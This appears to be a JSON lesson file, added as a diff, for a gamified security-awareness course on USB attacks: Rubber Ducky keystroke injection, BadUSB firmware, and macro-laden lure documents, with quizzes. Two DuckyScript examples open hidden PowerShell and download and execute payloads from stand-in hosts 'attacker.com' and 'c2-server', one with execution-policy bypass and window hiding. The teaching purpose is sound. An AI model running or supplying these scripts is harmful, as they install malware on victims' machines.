@@ -1,0 +1,149 @@
+{
+    "id": "l2",
+    "chapterId": "ch_7",
+    "title": "USB Attack Vectors & Payloads",
+    "description": "Explore the technical methods: Rubber Ducky, BadUSB firmware attacks, and malicious macros.",
+    "xpReward": 35,
+    "estimatedMinutes": 9,
+    "section": "Technical Vectors",
+    "slides": [
+        {
+            "id": "s_l2_1",
+            "type": "text",
+            "title": "Types of USB Attacks 🔌",
+            "content": "# More Than Just a Storage Device\n\nA USB port is a **trusted interface**. When you plug in a device, the computer asks: *\"What are you?\"* The device answers: *\"I'm a keyboard\"* or *\"I'm a network adapter\"* or *\"I'm storage.\"* **The computer trusts this answer.**\n\n**Three Primary USB Attack Vectors:**\n\n| Type | How It Works | Example |\n| :--- | :--- | :--- |\n| **HID Spoofing (Rubber Ducky)** | Pretends to be a **keyboard** and types commands at superhuman speed. | Opens PowerShell, downloads malware. |\n| **BadUSB (Firmware Reprogramming)** | Rewrites the **firmware** of a legitimate USB drive to act maliciously. | Emulates a keyboard AND a network adapter simultaneously. |\n| **Autorun / Malicious Files** | Relies on the user **double-clicking** a file on a standard storage drive. | `Invoice.pdf.exe` or macro-enabled document. |"
+        },
+        {
+            "id": "s_l2_2",
+            "type": "quiz",
+            "title": "USB Attack Types 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l2_1",
+                "type": "multiple_choice",
+                "question": "Which USB attack vector requires the user to manually open a file to trigger the payload?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Rubber Ducky",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "BadUSB",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Autorun / Malicious File",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "All of the above",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. Autorun and file-based attacks rely on user interaction (clicking). HID spoofing and BadUSB execute automatically upon connection.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l2_3",
+            "type": "text",
+            "title": "Vector 1: HID Spoofing (Rubber Ducky) 🦆",
+            "content": "# The World's Fastest Typist\n\n**Device:** USB Rubber Ducky (Hak5) or similar microcontroller (Arduino, Raspberry Pi Pico).\n**How It Works:** The device tells the computer: *\"I am a USB Keyboard.\"* The computer says: *\"Welcome, keyboard!\"* The device then **types** a pre-programmed script at 1000+ words per minute.\n\n**Simple Rubber Ducky Script (DuckyScript):**\n```\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -WindowStyle Hidden\nENTER\nDELAY 500\nSTRING IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\nENTER\n```\n**Translation:**\n1.  Wait 1 second.\n2.  Press `Windows Key + R` (Opens Run dialog).\n3.  Type `powershell` and press Enter.\n4.  Type a command to download and execute a script from the internet.\n\n**Result:** The user sees a quick flash of windows and then... nothing. Malware is installed."
+        },
+        {
+            "id": "s_l2_4",
+            "type": "code",
+            "title": "Rubber Ducky Script Example 🦆",
+            "content": "A more stealthy script that minimizes visual disruption:",
+            "codeSnippet": "REM Minimize all windows first to hide activity\nDELAY 500\nGUI d\nDELAY 200\n\nREM Open PowerShell hidden\nGUI r\nDELAY 200\nSTRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass\nENTER\nDELAY 500\n\nREM Command to fetch and execute payload\nSTRING $c=New-Object Net.WebClient;$c.DownloadString('http://c2-server/payload')|IEX;\nENTER\n\nREM Close PowerShell window\nSTRING exit\nENTER",
+            "codeLanguage": "duckyscript",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l2_5",
+            "type": "quiz",
+            "title": "Rubber Ducky Check 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l2_2",
+                "type": "multiple_choice",
+                "question": "What is the primary advantage of a Rubber Ducky attack over a standard malicious file?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "It works on Mac and Linux only",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "It executes automatically without user interaction (beyond plugging in)",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "It bypasses all antivirus software",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "It is undetectable by any means",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. The device types commands as a trusted keyboard. No user clicking required. AV may still detect the downloaded payload, but the initial execution is automatic.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l2_6",
+            "type": "text",
+            "title": "Vector 2: BadUSB (Firmware Attack) 👾",
+            "content": "# The Shape-Shifter\n\n**BadUSB** takes HID spoofing to the **next level**.\n\n**Difference:**\n- **Rubber Ducky:** A dedicated microcontroller board designed for this purpose. Looks like a flash drive but isn't.\n- **BadUSB:** A **real USB flash drive** whose **firmware** (the chip that controls the drive) has been **reprogrammed** to be malicious.\n\n**Capabilities:**\n- Emulates **multiple devices simultaneously** (e.g., Keyboard + Network Adapter + Storage).\n- When plugged in as storage, it shows a **clean, empty drive**. But behind the scenes, it's typing commands.\n- Can **alter the contents** of files copied to it on the fly.\n- **Undetectable by antivirus** because the malware is in the firmware, not the storage partition.\n\n**The Nightmare Scenario:** An employee plugs in a 'lost' USB to find the owner. They see one file: `Resume.pdf`. They open it. Simultaneously, the firmware emulates a keyboard and installs a backdoor."
+        },
+        {
+            "id": "s_l2_7",
+            "type": "warning",
+            "title": "Vector 3: Autorun & Malicious Docs 📄",
+            "content": "# The Old School Method (Still Works)\n\n**Autorun.inf (Legacy):**\n- Windows used to automatically execute programs from USB drives via an `autorun.inf` file.\n- **Modern Windows:** Autorun is **disabled by default** for USB drives (since Windows 7).\n- **BUT:** Many **industrial control systems (ICS)** and **legacy medical devices** still run old OS versions. Autorun is still a valid vector in niche environments.\n\n**The Modern Alternative: Malicious Documents**\n1.  Place a **macro-enabled Word/Excel document** on the drive.\n2.  Name it something enticing: `Salary_Adjustments_Q3.docm` or `Termination_List.xlsm`.\n3.  When opened, the user sees: *\"This document is protected. Enable Content to view.\"*\n4.  They click **'Enable Content'**.\n5.  **Macro executes.** Downloads and runs malware.\n\n**Why It Works:** Users are conditioned to click 'Enable Content' on documents from 'trusted' sources. A found USB drive feels 'internal' and therefore 'trusted'."
+        },
+        {
+            "id": "s_l2_8",
+            "type": "quiz",
+            "title": "BadUSB vs. Rubber Ducky 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l2_3",
+                "type": "multiple_choice",
+                "question": "What is the key advantage of a BadUSB attack over a standard Rubber Ducky?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "It's cheaper",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "It can act as a normal flash drive AND a malicious device simultaneously, making it more stealthy",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "It types faster",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "It works without being plugged in",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. A BadUSB looks and functions like a real flash drive (storage works), so the victim sees files and doesn't suspect anything. The Rubber Ducky cannot function as storage (typically).",
+                "xpReward": 10
+            }
+        }
+    ]
+}
